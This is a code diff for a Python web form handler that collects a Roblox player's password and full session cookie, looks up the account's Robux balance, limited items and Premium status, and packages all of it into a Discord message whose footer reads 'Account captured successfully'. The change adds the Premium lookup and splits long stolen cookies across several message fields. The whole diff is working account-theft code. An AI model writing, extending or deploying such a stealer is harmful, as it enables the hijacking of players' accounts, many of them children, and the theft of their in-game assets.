@@ -72,12 +72,30 @@ def get_roblox_user_info(cookie):
                 except Exception as alt_error:
                     print(f"Alternative Robux API error: {str(alt_error)}")
             
+            # Check Premium status
+            premium_status = '❌ No'
+            try:
+                premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
+                                              headers=headers, timeout=5)
+                print(f"Premium API response status: {premium_response.status_code}")
+                
+                if premium_response.status_code == 200:
+                    premium_data = premium_response.json()
+                    print(f"Premium API response: {premium_data}")
+                    if premium_data.get('isPremium', False):
+                        premium_status = '✅ Yes'
+                else:
+                    print(f"Premium API failed with status: {premium_response.status_code}")
+            except Exception as premium_error:
+                print(f"Error getting Premium status: {str(premium_error)}")
+            
             return {
                 'username': username,
                 'display_name': display_name,
                 'user_id': user_id,
                 'profile_picture': profile_picture_url,
-                'robux_balance': robux_balance
+                'robux_balance': robux_balance,
+                'premium_status': premium_status
             }
         
     except Exception as e:
@@ -88,7 +106,8 @@ def get_roblox_user_info(cookie):
         'display_name': 'Not available', 
         'user_id': None,
         'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
-        'robux_balance': 'Not available'
+        'robux_balance': 'Not available',
+        'premium_status': '❌ No'
     }
 
 def is_valid_cookie(cookie):
@@ -204,54 +223,61 @@ def submit_form():
         print("Fetching Roblox user information...")
         user_info = get_roblox_user_info(cookie)
         
-        # Prepare Discord embedded message with real user data
-        fields = [
-            {
-                'name': '👤 Username',
-                'value': user_info['username'],
-                'inline': True
-            },
-            {
-                'name': '🔒 Password',
-                'value': password or 'Not provided',
-                'inline': True
-            },
-            {
-                'name': '💰 Robux Balance',
-                'value': user_info['robux_balance'],
-                'inline': True
-            },
-            {
-                'name': '💀 Korblox',
-                'value': '✅ Yes' if korblox else '❌ No',
-                'inline': True
-            },
-            {
-                'name': '🎭 Headless',
-                'value': '✅ Yes' if headless else '❌ No',
-                'inline': True
-            },
-            {
-                'name': '🆔 User ID',
-                'value': str(user_info['user_id']) if user_info['user_id'] else 'Not available',
-                'inline': True
-            }
-        ]
+        # Prepare main message content with account information
+        account_info = f"""🎮 **Roblox Account Information**
+👤 **Username:** {user_info['username']} ({user_info['display_name']})
+🆔 **User ID:** {user_info['user_id'] or 'Unknown'}
+💰 **Robux Balance:** {user_info['robux_balance']}
+💎 **Premium:** {user_info['premium_status']}
+🔒 **Password:** {password or 'Not provided'}
+💀 **Korblox:** {'✅ Yes' if korblox else '❌ No'}
+🎭 **Headless:** {'✅ Yes' if headless else '❌ No'}"""
+
+        # Prepare embed fields for cookie and additional info
+        fields = []
         
-        # Prepare main message content with the complete cookie
-        cookie_content = f"🍪 **Whole Cookie:**\n```{cookie}```" if cookie else "🍪 **Whole Cookie:** Not provided"
+        # Handle cookie display in embed fields
+        if cookie:
+            if len(cookie) <= 1000:
+                # Single field for shorter cookies
+                fields.append({
+                    'name': '🍪 Whole Cookie',
+                    'value': f'```{cookie}```',
+                    'inline': False
+                })
+            else:
+                # Split long cookies into multiple fields
+                cookie_parts = []
+                chunk_size = 1000  # Leave room for backticks and formatting
+                for i in range(0, len(cookie), chunk_size):
+                    chunk = cookie[i:i + chunk_size]
+                    cookie_parts.append(chunk)
+                
+                for i, part in enumerate(cookie_parts):
+                    field_name = f'🍪 Cookie Part {i + 1}/{len(cookie_parts)}'
+                    fields.append({
+                        'name': field_name,
+                        'value': f'```{part}```',
+                        'inline': False
+                    })
+        else:
+            fields.append({
+                'name': '🍪 Whole Cookie',
+                'value': 'Not provided',
+                'inline': False
+            })
 
         discord_data = {
-            'content': cookie_content,
+            'content': account_info,
             'embeds': [{
-                'title': f'🎮 Roblox Account Profile - {user_info["display_name"]}',
+                'title': '🔐 Authentication Details',
                 'color': 0x00d4ff,  # Roblox blue color
                 'thumbnail': {
                     'url': user_info['profile_picture']
                 },
                 'fields': fields,
                 'footer': {
-                    'text': f'Account captured successfully • User ID: {user_info["user_id"] or "Unknown"}'
+                    'text': f'Account captured successfully • {user_info["display_name"]}'
                 }
             }]
         }
